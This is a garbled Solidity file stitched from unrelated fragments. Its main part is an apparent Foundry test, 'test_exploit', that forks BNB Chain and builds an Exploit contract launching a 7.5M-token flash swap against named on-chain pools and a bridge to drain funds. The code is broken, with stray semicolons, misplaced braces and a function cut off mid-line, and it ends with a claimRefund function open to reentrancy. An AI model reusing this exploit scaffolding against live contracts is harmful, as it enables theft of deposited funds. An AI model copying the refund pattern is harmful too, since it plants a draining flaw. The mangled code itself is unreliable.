
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

;
;
interface IPool{
    function swap(address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline) external returns (uint256 actualToAmount, uint256 haircut);
    function deposit(uint256 amount) external};
interface IPool2{
    function deposit(uint256 amount) external;
    function withdraw(uint256 amountLp) external};
interface IBridge{
    function swap(uint256 amount,
        bytes32 token,
        bytes32 receiveToken,
        address recipient)
        external };
contract ContractTest is Test {
    function setUp() external {
        vm.createSelectFork("bsc", 26982067)};
    function test_exploit() external {
        Exploit exploit = new Exploit();
        exploit.run()};
contract Exploit{
    IPancakePair pancakeSwap = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPool pool_0x312B = IPool(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);
    IPool2 pool_0x179a = IPool2(0x179aaD597399B9ae078acFE2B746C09117799ca0);
    IPool2 pool_0xb19c = IPool2(0xB19Cd6AB3890f18B662904fd7a40C003703d2554);
    IBridge bridge = IBridge(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);
    function run() external {
        console.log("hacker BUSD bal before attack is       ", BUSD.balanceOf(tx.origin));
        pancakeSwap.swap(0,
            7_500_000e18,
            address(this),;
            "Gimme da loot")};
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        BUSD.approve(address(pool_0x312B), type(uint
function sendToNoFallback(address payable recipient) public {
    recipient.transfer(1 ether)}
function claimRefund() public {
    uint refund = balances[msg.sender];
    require(refund > 0);
    (bool ok, ) = msg.sender.call{value: refund}("");
    require(ok);
    balances[msg.sender] = 0}